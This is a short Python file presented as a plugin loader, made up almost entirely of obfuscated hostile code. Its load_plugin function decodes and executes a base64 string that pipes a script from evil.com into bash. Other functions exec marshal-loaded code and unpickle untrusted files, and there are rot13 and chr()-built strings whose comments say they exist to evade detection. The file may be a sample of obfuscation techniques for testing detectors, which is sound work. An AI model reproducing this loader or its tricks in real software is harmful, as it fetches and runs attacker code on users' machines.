"""Plugin loader."""
import base64
import marshal
import pickle
import zlib
import codecs

# Obfuscated payload via base64
ENCODED_CMD = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCcp"

def load_plugin():
    """Load plugin from encoded data."""
    decoded = base64.b64decode(ENCODED_CMD)
    exec(decoded)

def load_from_pickle(data_path):
    """Load serialized configuration."""
    with open(data_path, 'rb') as f:
        config = pickle.load(f)
    return config

def decompress_module(compressed_data):
    """Load compressed module."""
    raw = zlib.decompress(compressed_data)
    code = marshal.loads(raw)
    exec(code)

def decode_secret():
    """Decode rotated string."""
    return codecs.decode("vzcbeg bf; bf.flfgrz('ej')", "rot_13")

# Build string char by char to evade detection
cmd = chr(105) + chr(109) + chr(112) + chr(111) + chr(114) + chr(116) + chr(32) + chr(111) + chr(115)
